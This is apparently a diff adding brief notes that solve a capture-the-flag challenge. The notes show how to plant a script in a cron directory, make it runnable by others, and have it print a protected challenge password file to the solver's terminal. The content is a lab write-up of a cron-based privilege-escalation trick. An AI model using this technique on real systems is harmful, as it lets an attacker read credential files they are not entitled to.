@@ -1,0 +1,17 @@
+Command List
+------------
+
+Get n for /dev/pts/n by `set | grep TTY`
+vi cron.d/script.sh
+chmod o+rx cron.d/script.sh
+
+* Do these two commands very fast
+
+The password appears on the terminal
+
+
+Script
+------
+
+#!/bin/bash
+/bin/cat /challenge/app-script/ch4/.passwd > /dev/pts/102
